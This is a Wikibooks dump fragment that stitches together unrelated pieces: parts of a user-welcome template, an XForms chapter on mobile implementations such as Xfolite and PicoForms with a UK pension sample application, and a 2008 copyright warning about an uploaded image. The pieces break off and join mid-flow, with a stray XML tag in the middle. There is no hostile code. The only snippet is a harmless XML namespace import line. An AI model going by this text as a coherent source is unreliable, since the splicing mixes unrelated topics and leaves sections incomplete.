*The eligibility to become an [[Help:Administrators|administrator]] 
*The right to be heard in votes and elections
*Your IP address will no longer be visible to other users.

We hope that you choose to become a Wikibookian and '''[[Special:Userlogin|create an account]]'''. Feel free to ask me any questions you may have on my talk page. By the way, make sure to sign your posts and comments with four tildes ('''&amp;#126;&amp;#126;&amp;#126;&amp;#126;'''), which will let others know who left it.

      <text xml:space="preserve">==Advantages to the Developer==
Apart from the advantages of XForms already cited elsewhere, XForms brings the following advantages to the sphere of mobile applications:
*XForms was designed to support multiple modalities. Applications that work on mobile devices are also deployable in other ways too, thus much improving the return on your development investment.
*XForms does most of its work on the client-side, thus reducing the number and size of server calls. This is still an important consideration for mobile devices, which tend to have to operate on narrow and expensive bandwidth.
 
==Building Mobile Applications==
Whilst there is a [http://www.w3.org/TR/2003/CR-xforms-basic-20031014/ Basic] profile of XForms, the only known, commercial implementation also supports almost the entire XForms/XML Schema feature set.

===Open Source Implementations ===

==== Xfolite ====

[http://www.xfolite.org Xfolite] is a light-weight XForms client for the J2ME platform. It was originally created at Nokia Research Center, and it includes a DOM and XPath 1.0 implementation as well as an XForms engine that implements the XForms 1.1 specification almost completely. XML Schemas and CSS are outside project scope, however. Xfolite is licensed under the LGPL license.

=== Commercial Implementations===
====PicoForms====
[http://www.picoforms.com PicoForms] has an XForms implementation that runs on cell phones supporting MIDP 2.0 and CLDC 1.x. It also supports PDAs including Palm and Pocket PCs. PicoForms is also able to provide customers (and evaluators) with an online development space, that allows forms to be tested on a mobile phone/PDA emulator.

Picoforms runs as an plugin to Internet Explorer.  The license is around $30 (US) per client (desktop).

To enable your forms to work with Picoforms just add the following line to your code:

&lt;source lang=&quot;xml&quot;&gt;
&lt;?import namespace=&quot;xf&quot; implementation=&quot;#default#pxf&quot;?&gt;
&lt;/source&gt;

==Sample Applications for PicoForms ==
===UK Pension Industry===
This application uses a set of industry standard XML schema (produced by [http://www.origostandards.com Origo Services]) in the UK. XForms lends itself well to building applications over such schema, as the schema can be consumed directly by the application, often without modification.

====The Scenario====
The Schemas describe the data requirements for a financial adviser requesting information about the value of funds in a customer's personal pension policy. An adviser is likely to want to do this immediately prior to meeting with their client, probably in the client's own home. They want the information to be as up-to-date as possible.

====The Application====
The following screenshots give an idea of the application running on a mobile phone emulator. The application can be accessed in an emulator [http://www.picoforms.com/wiki/index.php/UK_Life_and_Pensions here].

To begin with the user must search for the details of the client they are interested in. This simulates communication with the adviser's own back-office system. This can be achieved either by entering a unique reference for the client, or the client's name.[[Image:Pensionformselcustomer.png]]

== Copyright problem with [[:Image:FirstRoomInGameRadiant.jpg]] ==
{{mbox|type=warning|msg=
Thanks for uploading [[:Image:FirstRoomInGameRadiant.jpg]]. The [[w:Wikimedia Foundation|Wikimedia Foundation]] is very careful about what Wikibooks includes because of [[w:United States copyright law|copyright law]], and requires that we maintain a strict [[Wikibooks:Copyright|copyright policy]]. [[:Image:FirstRoomInGameRadiant.jpg]] and other files you uploaded may soon be deleted unless a [[Wikibooks:Fair use policy#What is Permitted on Wikibooks|rationale]] for a fair use claim is provided. In order to upload fair use material, specific rationale must be provided as to why fair use media is necessary, and how there are no free alternatives. Images or other media that do not have such rationale will likely be deleted as a copyright violation. If the information of a fair use media component could be duplicated by a free alternative, that media may not be uploaded. Please edit image descriptions pages directly to add this information; there's no need to upload the image again. If you have any questions, feel free to contact me, or ask another Wikibookian at the [[Wikibooks:Study help desk|help desk]].

See {{UserImages2}} for a complete list of your uploads which may get deleted soon.&lt;br/&gt;Thank you. &amp;nbsp;'''&amp;ndash;&amp;nbsp;[[User:Mike.lifeguard|&lt;font color=&quot;Indigo&quot;&gt;Mike.lifeguard&lt;/font&gt;]]'''&amp;nbsp;&amp;#124;&amp;nbsp;&lt;sup&gt;[[User talk:Mike.lifeguard|&lt;font color=&quot;Indigo&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 16:56, 15 February 2008 (UTC)}}

* Wikibooks is a collection of open-source textbooks. See [[WB:WIW|What is Wikibooks]] to find out what types of books are acceptable.
* To learn the wiki-markup-language syntax, see [[Help:Editing]].
* You should sign your name on Talk and vote pages using four tildes, like this: &amp;#126;&amp;#126;&amp;#126;&amp;#126; 
**There is a box at the top of the edit window that will insert this, too; it looks like part of a signature.
* Remember to conduct any editing experiments in the [[Wikibooks:Sandbox|sandbox]].
* You can tell the community something about yourself in your userpage.
** You can get to this page by clicking the tab at the top of the page labeled with your registered username.
* If you are a '''Wikipedian''', see [[Wikibooks:Wikibooks for Wikipedians]] for a primer on how things work here (it's a little different).
** If you want to base your work here on materials from Wikipedia, please use [[WB:RFI]] (requests for importation) to bring the material over in compliance with the GFDL.
* If you're an '''instructor''' and plan on using Wikibooks for a class project, see [[Wikibooks:Guidelines for class projects]]
* Please say hello at the [[WB:SL|Staff Lounge]] with any questions or ideas.
* Eventually, you might want to read the [[Wikibooks:Manual of Style|Manual of Style]] and [[Wikibooks:Policies and guidelines|Policies and Guidelines]].
** Please take a look at [[Wikibooks:Naming policy]] before starting a new book.
* Remember to maintain a [[Wikibooks:Neutral point of view|Neutral point of view]].
* Explore, [[Wikibooks:Be bold in updating pages|be bold in editing pages]], and have fun!
